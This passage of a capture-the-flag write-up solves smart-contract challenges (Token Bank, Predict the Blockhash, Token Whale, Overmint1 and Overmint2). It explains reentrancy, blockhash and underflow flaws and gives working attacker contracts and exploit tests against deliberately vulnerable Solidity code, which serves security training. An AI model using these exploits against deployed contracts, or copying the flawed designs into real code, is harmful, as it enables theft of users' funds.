    }

    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return interfaceId == type(IERC1155Receiver).interfaceId;
    }
}
```

_Overmint1-ERC1155.js_
```javascript
const {
    loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Overmint1_ERC1155";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy();

        return { victimContract, attackerWallet };
    }

    describe("exploit", async function () {
        let victimContract, attackerWallet;
        before(async function () {
            ({ victimContract, attackerWallet } = await loadFixture(setup));
        })

        it("conduct your attack here", async function () {
            const AttackerFactory = await ethers.getContractFactory("Overmint1_ERC1155_Attacker");
            const attackerContract = await AttackerFactory.connect(attackerWallet).deploy(victimContract.address);
            await attackerContract.connect(attackerWallet).attack();
        });

        after(async function () {
            expect(await victimContract.balanceOf(attackerWallet.address, 0)).to.be.equal(5);
            expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.lessThan(3, "must exploit in two transactions or less");
        });
    });
});
```

## Capture the Ether (RareSkills Repo) - Token Bank

### Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ITokenReceiver {
    function tokenFallback(address from, uint256 value, bytes memory data) external;
}

contract SimpleERC223Token {
    // Track how many tokens are owned by each address.
    mapping(address => uint256) public balanceOf;

    string public name = "Simple ERC223 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function isContract(address _addr) private view returns (bool is_contract) {
        uint256 length;
        assembly {
            //retrieve the size of the code on target address, this needs assembly
            length := extcodesize(_addr)
        }
        return length > 0;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        bytes memory empty;
        return transfer(to, value, empty);
    }

    function transfer(address to, uint256 value, bytes memory data) public returns (bool) {
        require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);

        if (isContract(to)) {
            ITokenReceiver(to).tokenFallback(msg.sender, value, data);
        }
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value) public returns (bool success) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool success) {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
}

contract TokenBankChallenge {
    SimpleERC223Token public token;
    mapping(address => uint256) public balanceOf;
    address public player;

    constructor(address _player) {
        token = new SimpleERC223Token();
        player = _player;
        // Divide up the 1,000,000 tokens, which are all initially assigned to
        // the token contract's creator (this contract).
        balanceOf[msg.sender] = 500000 * 10 ** 18; // half for me
        balanceOf[player] = 500000 * 10 ** 18; // half for you
    }

    function addcontract(address _contract) public {
        balanceOf[_contract] = 500000 * 10 ** 18;
    }

    function isComplete() public view returns (bool) {
        return token.balanceOf(address(this)) == 0;
    }

    function tokenFallback(address from, uint256 value, bytes memory data) public {
        require(msg.sender == address(token));
        require(balanceOf[from] + value >= balanceOf[from]);

        balanceOf[from] += value;
    }

    function withdraw(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount);

        require(token.transfer(msg.sender, amount));
        unchecked {
            balanceOf[msg.sender] -= amount;
        }
    }
}
```

### Exploit

I'm not sure whether this design is intentional, but the RareSkills challenge differs from the original Capture the Ether challenge. More specifically, the RareSkills version contains an additional function, `addcontract`, that can be used to drain the bank easily. The most convenient way to follow along is Remix.

After deployment, we have `token.balanceOf(address(this)) == 10**6 * 10**18`, where `address(this)` refers to the bank's address. To complete the challenge, we must reduce this balance to 0.

However, achieving that is straightforward by using the following sequence of actions:

1. Deploy `TokenBankChallenge` specifying the deployer's address as the `_player`.
2. Call `withdraw` from the deployer's account, specifying the amount to be `500_000_000_000_000_000_000_000`.
3. Call `addcontract`, specifying the deployer's address for the `_contract` parameter.
4. Call `withdraw` from the deployer's account, specifying the amount to be `500_000_000_000_000_000_000_000`.

Performing the above steps solves the challenge.

NOTE: The original Capture the Ether challenge does _not_ contain the `addcontract` function. However, notice that `withdraw` doesn't follow the checks-effects-interactions pattern and is, therefore, vulnerable to reentrancy. (Note that `transfer` calls `tokenFallback` on the receiver.) A detailed solution for this original case is explained in [Christoph Michel's Capture the Ether blog post](https://cmichel.io/capture-the-ether-solutions/).

## Capture the Ether (RareSkills Repo) - Predict the Block Hash

### Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

//Challenge
contract PredictTheBlockhash {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether, "Requires 1 ether to create this contract");
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == address(0), "Requires guesser to be zero address");
        require(msg.value == 1 ether, "Requires msg.value to be 1 ether");

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser, "Requires msg.sender to be guesser");
        require(block.number > settlementBlockNumber, "Requires block.number to be more than settlementBlockNumber");

        bytes32 answer = blockhash(settlementBlockNumber);

        guesser = address(0);
        if (guess == answer) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
            require(ok, "Transfer to msg.sender failed");
        }
    }
}
```

### Exploit

To exploit this contract, it's important to know that `blockhash` only returns the actual block hash for the last 256 blocks due to performance reasons. For any blocks that lie further in the past, `blockhash` will return `0x0000000000000000000000000000000000000000000000000000000000000000`.

Therefore, we can call `lockInGuess` with `hash = 0x0000000000000000000000000000000000000000000000000000000000000000`, wait until the corresponding block lies far enough in the past, and finally call `settle`.

_PredictTheBlockhash.t.sol_

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../src/PredictTheBlockhash.sol";

contract PredictTheBlockhashTest is Test {
    PredictTheBlockhash public predictTheBlockhash;

    function setUp() public {
        predictTheBlockhash = (new PredictTheBlockhash){value: 1 ether}();
    }

    function testExploit() public {
        // Set block number
        uint256 blockNumber = block.number;

        // Put your solution here
        predictTheBlockhash.lockInGuess{value: 1 ether}(
            0x0000000000000000000000000000000000000000000000000000000000000000
        );

        vm.roll(blockNumber + 258);
        predictTheBlockhash.settle();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheBlockhash.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
```

## Capture the Ether (RareSkills Repo) - Token Whale

### Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract TokenWhale {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address _player) {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000;
    }

    function _transfer(address to, uint256 value) internal {
        unchecked {
            balanceOf[msg.sender] -= value;
            balanceOf[to] += value;
        }

        emit Transfer(msg.sender, to, value);
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }
}
```

## Exploit

This challenge is conveniently solved via Remix. To increase the `player`'s token balance to 1M (or more), we'll use two different accounts and perform the following sequence of function calls:

1. Set `_player` to an EOA you control, e.g., the first of Remix's default accounts. This will give `player` an account balance of 1000.
2. Next, approve a second EOA you control, e.g., the second of Remix's default accounts, with `value = 1`. Ensure to make this function call from `player`'s account.
3. Now, call `transferFrom(player, player, 1)` from the second EOA. At first sight, one would assume that this wouldn't change anything since we're just sending `value = 1` from the `player` to the `player`. However, by taking a closer look at the implementation of `_transfer`, we see that this call will underflow the second EOA's balance (and add 1 to the `player`'s balance). In other words, after this call, `player` has a balance of 1001 while the second EOA has a balance of `2**256 - 1`!
4. Lastly, we can use `transfer` to transfer `value = 998999` (or more) from the second EOA to `player`, leaving `player` with a balance of 1000000 (or more).

Note that the `to` argument in the above call to `transferFrom` can actually be chosen arbitrarily. The important point in the above sequence is not that we increase the `player`'s balance from 1000 to 1001, but that we underflow the balance of our second EOA so that this account has enough tokens to bump up `player`'s balance to 1M or more. 

# NFT Variants and Staking

## RareSkills Riddles - Overmint1

### Contract

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract Overmint1 is ERC721 {
    using Address for address;
    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint1", "AT") {}

    function mint() external {
        require(amountMinted[msg.sender] <= 3, "max 3 NFTs");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }

    function success(address _attacker) external view returns (bool) {
        return balanceOf(_attacker) == 5;
    }
}
```

### Exploit

The goal of this challenge is to mint 5 tokens in a single transaction.

We can achieve this by performing a reentrancy attack, exploiting the fact that `mint` does not follow the checks-effects-interactions pattern since `_safeMint` calls `onERC721Received` on the receiving contract before updating `amountMinted`.

Here's an example of an attacker contract we can use:

_Overmint1Attacker.sol_
```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./Overmint1.sol";

contract Overmint1Attacker is IERC721Receiver {
    Overmint1 public overmint1;

    constructor(address _overmint1Address) {
        overmint1 = Overmint1(_overmint1Address);
    }

    function attack() public {
        overmint1.mint();
        for (uint256 i = 1; i < 6; i++) {
            overmint1.transferFrom(address(this), msg.sender, i);
        }
    }

    // This function is called by the Overmint1 contract during _safeMint
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        override
        returns (bytes4)
    {
        // Check the number of tokens minted, and if it's less than 5, mint again
        if (overmint1.balanceOf(address(this)) < 5) {
            overmint1.mint();
        }
        return this.onERC721Received.selector;
    }
}
```

_Overmint1.js_
```javascript
const { time, loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Overmint1";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy();

        return { victimContract, attackerWallet };
    }

    describe("exploit", async function () {
        let victimContract, attackerWallet;
        before(async function () {
            ({ victimContract, attackerWallet } = await loadFixture(setup));
        });

        it("conduct your attack here", async function () {
            const AttackerFactory = await ethers.getContractFactory("Overmint1Attacker");
            const attackerContract = await AttackerFactory.connect(attackerWallet).deploy(victimContract.address);
            await attackerContract.connect(attackerWallet).attack();
        });

        after(async function () {
            expect(await victimContract.balanceOf(attackerWallet.address)).to.be.equal(5);
            expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.lessThan(
                3,
                "must exploit in two transactions or less"
            );
        });
    });
});
```

## RareSkills Riddles - Overmint2

### Contract

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract Overmint2 is ERC721 {
    using Address for address;
    uint256 public totalSupply;

    constructor() ERC721("Overmint2", "AT") {}

    function mint() external {
        require(balanceOf(msg.sender) <= 3, "max 3 NFTs");
        totalSupply++;
        _mint(msg.sender, totalSupply);
    }

    function success() external view returns (bool) {
        return balanceOf(msg.sender) == 5;
    }
}
```

### Exploit

In a public mint, people can generally mint as many NFTs as they want to, either by minting over and over or by colluding with other buyers. The only challenge here is that we have to mint 5 tokens _in a single transaction_.

First, notice that the `mint` function's `require` prevents us from minting 5 tokens to a single address - it only allows us to mint 4. Based on the short error message, it's hard to say if the intention was to cap the mint at 3 or 4. In any case, the above implementation allows us to mint a total of 4 tokens to an attacker contract by calling `mint` multiple times via a for-loop.

However, this is not yet enough to solve the riddle. To mint the fifth NFT, we can make use of an accomplice/minion contract that mints the remaining NFT for us.

To ensure all these steps happen within a single transaction (the deployment transaction), we have to execute all of these steps inside the constructor of our attacker. Also, notice that our attacker and minion contracts have to send the tokens to the EOA that initiated the attack for the test suite to confirm that the exploit has been successful.

_Overmint2Attacker.sol_
```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./Overmint2.sol";

contract Minion {
    Overmint2 public overmint2;

    constructor(address _overmint2Address) {
        overmint2 = Overmint2(_overmint2Address);
    }

    function attack() public {
        overmint2.mint();
        overmint2.transferFrom(address(this), tx.origin, 5);
    }
}

contract Overmint2Attacker {
    Overmint2 public overmint2;

    constructor(address _overmint2Address) {
        overmint2 = Overmint2(_overmint2Address);
        Minion minion = new Minion(_overmint2Address);

        for (uint256 i; i < 4; i++) {
            overmint2.mint();
        }

        for (uint256 i = 1; i < 5; i++) {
            overmint2.transferFrom(address(this), msg.sender, i);
        }

        minion.attack();
    }
}
```

_Overmint2.js_
```javascript
const { time, loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Overmint2";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy();

        return { victimContract, attackerWallet };
    }

    describe("exploit", async function () {
        let victimContract, attackerWallet;
        before(async function () {
            ({ victimContract, attackerWallet } = await loadFixture(setup));
        });

        it("conduct your attack here", async function () {
            const AttackerFactory = await ethers.getContractFactory("Overmint2Attacker");
            const attackerContract = await AttackerFactory.connect(attackerWallet).deploy(victimContract.address);
        });

        after(async function () {
            expect(await victimContract.balanceOf(attackerWallet.address)).to.be.equal(5);
            expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.equal(
                1,
                "must exploit one transaction"
            );
        });
    });
});
```
